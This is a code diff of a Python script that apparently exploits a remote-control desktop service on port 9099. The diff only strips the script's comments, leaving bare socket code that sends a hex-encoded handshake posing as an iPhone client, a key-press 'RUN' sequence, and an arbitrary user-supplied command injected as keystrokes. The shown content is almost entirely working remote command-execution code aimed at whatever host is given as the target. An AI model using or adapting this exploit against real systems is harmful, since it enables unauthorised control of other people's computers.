@@ -17,7 +17,7 @@ host = args.target
 command = args.cmd
 port = 9099  # Default Port
 
-# Create a socket connection
+
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 try:
     s.connect((host, port))
@@ -26,12 +26,12 @@ except Exception as e:
     print(e)
     exit(1)
 
-# Connection sequence
+
 CONN = bytearray.fromhex("434F4E4E4543541E1E63686F6B726968616D6D6564691E6950686F6E651E321E321E04")
 s.send(CONN)
 sleep(0.5)
 
-# Send the RUN command
+
 RUN = bytearray.fromhex("4b45591e3131341e721e4f505404")
 s.send(RUN)
 sleep(0.5)
@@ -43,7 +43,7 @@ COMMAND = bytearray.fromhex("4B45591E3130301E" + hex_command + "1E04" + "4b45591
 s.send(COMMAND)
 sleep(0.5)
 
-# Receive and print the response (for debugging)
+
 try:
     response = s.recv(1024)
     print(response.decode())
